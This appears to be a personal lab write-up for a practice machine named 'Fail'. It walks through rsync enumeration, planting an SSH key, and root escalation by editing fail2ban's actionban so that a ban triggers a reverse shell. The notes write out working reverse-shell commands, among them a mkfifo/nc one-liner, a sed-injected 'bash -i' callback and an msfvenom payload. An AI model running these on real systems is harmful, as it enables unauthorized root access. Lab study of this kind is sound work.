# Fail Notes

## Data 

IP: 
OS:
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Fail-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks completed
      

![](reping.png)
searchsploit-rsync.png
sudo nmap -p- -oA nmap/rerescan-script-typo-All-TCP-slow --min-rate 10 192.168.229.126
https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
https://youssef-ichioui.medium.com/abusing-rsync-misconfiguration-to-get-persistent-access-via-ssh-2507d4a1690b
https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/


phindwhatrsynccantdo.png



bannerandmanenum.png

correctway.png

```bash
nc -nv $ip 873
@RSYNCDL: 31.0 # Server sends this just send it back
# Enumerate files - `#list` 
#list 
# If the send back a directory if @RSYNCD: AUTHREQD then password is required

# Similarly with rsync
rsync -av --list-only rsync://$ipaddress

# SSH Key syncing - https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/

ssh-keygen -f testkey
cat testkey.pub > authorized_keys


rsync -av .ssh rsync://192.168.243.126/fox

# /etc/rsyncd.secrets


rsync -vAXogEp  ./bash rsync://192.168.243.126/fox



```

whathashitisaskaiforthefirsttime.png

```
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04
```

Very normal crons
![](cronacronalong.png)

failedintothessh.png

```
fox@fail:/dev/shm$ find / -group fail2ban 2>/dev/null | grep -v '/run/\|/proc/\|/sys/' | xargs -I {} grep -r -e 'ass' {}
```

Itriedtouploadbashwithdifferentperms.png

The password does not crack...


Hint taken: Check your group membership and what processes are run on schedule. Enumerate the relevant directory. Then, abuse an action to get a shell.


```bash
# root will only be allowed to run this just for methodological thoroughness
fox@fail:/dev/shm$ which fail2ban 
# Path is not controllable
echo $PATH | tr -s ':' '\n'
/usr/local/bin
/usr/bin
/bin
/usr/local/games
/usr/games

fox@fail:/dev/shm$ find / -type d -group fail2ban -perm -o+w 2>/dev/null
/etc/fail2ban* # ARE not writable 
fox@fail:/dev/shm$ find / -type d -name *fail2ban* -ls 2>/dev/null
```

Triple check encase it is ever 5 minutes
whatwhereandwhy.png

Trying to work if /sbin/init that is symlinked to systemd is misconfigured
```
fox@fail:/dev/shm$ ps -o uid= -p $(pidof /sbin/init)
```

systemdessnut.png

pushphindtoaitheansweriamnotdorking.png

HELPED-THROUGHED because I am too ill and stress TO ONCE AGAIN READ THE GROUP PERMISSIONS FOR THE 3rd+ box in the last 3 months atleast

```

ls -l /etc/fail2ban/

cat /etc/fail2ban/README.fox 
# Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!


ls -l /etc/fail2ban/action.d

cat /etc/fail2ban/jail.conf

sed -i 's@actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>@actionban = bash -i \>\& \/192.168.45.217\/4444 0\>\&1@g' /etc/fail2ban/action.d/iptables-multiport.conf


```


theyearofthefacepalmandreadthegrouppiditisnotjustyouruser.png


pain.png

I would have never probably thought trying to ban my own ip so I need to reconfigure the way I think still on this issue. State of mind regardless 

Used `vim` instead of `sed` and added /dev/tcp - but as I noted earlier there is no /dev/tcp... which is very weird
testingwhatwentwrongwithmeandf2b.png

But the is the old trustworthy `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.210 10000 >/tmp/f` - which is much much better than going a check whether the vulnerable version of `nc` is installed

root.png

Now to annihilate fail2ban with testing and learn where to nuke logs for the cheatsheet and which to protect

First shell will reset with the 1 minute defaults so I tried creating persistence, but failed. 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=873 -f elf -o fail2brain
```
Even with a new process it still dropped, I tried adding another r00t user because of laziness and time and that did not work. So must move forward.

- Missing data
cp: cannot create symbolic link '/media/sf_data/Fail/fox-exposed-rsync-home-dir/.bash_history': Operation not permitted
cp: cannot create symbolic link '/media/sf_data/Fail/badRsyncIngs/MKBashPersistenceRSYNC/.bash_history': Operation not permitted


Beyond Root

fail2ban  fail till you win 

[juggernaut-sec fail2ban-lpe blog ](https://juggernaut-sec.com/fail2ban-lpe/) 


Aided by Phind

Fail2Ban is a security program that is designed to prevent brute force attacks. To do this, Fail2Ban scans log files like **/var/log/auth.log** and bans IP addresses conducting too many failed login attempts. Once an offending IP address is found, Fail2Ban updates system firewall rules to reject new connections from that IP address, for a configurable amount of time. 

**By default, Fail2Ban will ban an IP address for ten minutes when five authentication failures have been detected within ten minutes.**

Important configuration files:
- **fail2ban.conf** – Used to configure operational settings like how the daemon logs info, and the socket and pid file that it will use. While this file is important, it is not very interesting to us as the attacker.
- **jail.conf** – The main configuration file, which is used to define the per-application “jails”.
- j**ail.local** – An extension of jail.conf that is used to enable jails. Typically this is used to keep custom settings in place after updates.
- **iptables-multiport.conf** – The action file that is responsible for setting up the firewall with a structure that allows modifications for banning malicious hosts, and for adding and removing those hosts as necessary.
- **iptables.conf** – The “new” multiport action file used in Fail2Ban version >=1.0.1. This file exists in earlier versions, but it was not used for multiport config.

```bash
# Copy default configuration to then modify fail2ban.local and overide service configuration priority to now prioritize fail2ban.local  
cp /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.local
```
Modifiable values
- `loglevel`: The level of detail that Fail2ban’s logs provide can be set to 1 (error), 2 (warn), 3 (info), or 4 (debug).
- `logtarget`: Logs actions into a specific file. The default value of `/var/log/fail2ban.log` puts all logging into the defined file. Alternately, you can change the value to:
    - `STDOUT`: output any data
    - `STDERR`: output any errors
    - `SYSLOG`: message-based logging
    - `FILE`: output to a file
- `socket`: The location of the socket file.
- `pidfile`: The location of the PID file.

ALL PHIND - rewrite check and consider

Ask phind 
```
What are limitations of fail2ban for linux with regard to isolating vpn traffic with conditional?
```


Fail2Ban is a log-parsing application that monitors system logs for symptoms of an automated attack. It can be configured to protect any service that uses log files and can be subject to a compromise. However, there are some limitations when it comes to isolating VPN traffic with conditional rules [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).

1. **Limited to Services with Log Files**: Fail2Ban primarily works by monitoring log files for signs of malicious activity - [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).

2. **Relies on Regular Expressions**: Limited by the complexity of the regular expressions used and if regular expressions are not properly configured, Fail2Ban may fail to detect certain types of attacks [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).

3. **No Direct Control Over VPN Traffic**: Fail2Ban does not have direct control over VPN traffic. It can only monitor the logs of the VPN service and ban IP addresses based on those logs. [linode](https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/).

4. **Limited to IP-Based Bans**: Fail2Ban bans IP addresses based on the number of failed login attempts. This means that it cannot differentiate between different users on the same IP address. If multiple users are sharing the same IP address, a ban on one user could potentially block all of them [4](https://www.howtogeek.com/675010/how-to-secure-your-linux-computer-with-fail2ban/).

5. **No Encryption**: Fail2Ban does not provide encryption for the data it sends and receives. This means that if the network is not already encrypted, the data could be intercepted by an attacker. This is a limitation of Fail2Ban itself and not something that can be resolved by the configuration of Fail2Ban [4](https://www.howtogeek.com/675010/how-to-secure-your-linux-computer-with-fail2ban/).



As a Privilege Escalation Vector

Preventable with read only configuration files and root only control over the service to prevent restart 

Could be a useful last chance honey pot if attack has no way to spawn a shell to migrate too and therefore requires a reverse shell, which you could then monitor for changes to log and drop the jump box call back. Good for an initial breach honey pot one time use maybe.  



https://www.linode.com/docs/guides/using-fail2ban-to-secure-your-server-a-tutorial/

https://news.ycombinator.com/item?id=37795100

https://juggernaut-sec.com/fail2ban-lpe/